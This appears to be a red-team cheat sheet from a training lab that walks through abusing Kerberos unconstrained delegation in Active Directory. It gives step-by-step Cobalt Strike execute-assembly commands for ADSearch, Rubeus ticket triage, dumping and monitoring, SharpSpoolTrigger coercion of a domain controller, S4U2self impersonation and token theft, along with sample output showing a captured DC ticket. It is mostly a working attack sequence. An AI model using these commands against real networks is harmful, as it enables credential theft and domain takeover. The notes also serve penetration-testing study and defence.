# Get machines with unconstrained delegation in the Domain

```bash
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
```

---

# After compromising a machine on the list we can wait for a privileged account to interact with it to get the tgt cached

```bash
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```

---

# If a TGT is cached we can simply dump the ticket and pass the ticket to a proccess created by us

```bash
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
steal_token 1540

```

---

# We can also force computer accounts to authenticate remotely to grab their TGT and use s4U2self abuse

```bash
# Start listening with Rubeus on Web
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
# To stop monitoring use
jobs
jobkill <id>

# Use SharpSpoolTriget
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io

# We should see a ticket comming by on web
[*] 9/6/2022 2:44:52 PM UTC - Found new TGT:

  User                  :  DC-2$@DEV.CYBERBOTIC.IO
  StartTime             :  9/6/2022 9:06:14 AM
  EndTime               :  9/6/2022 7:06:14 PM
  RenewTill             :  9/13/2022 9:06:14 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    <ticket here>

# To use this machine ticket we need to use a s4u2self technique
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=
steal_token 2664

```
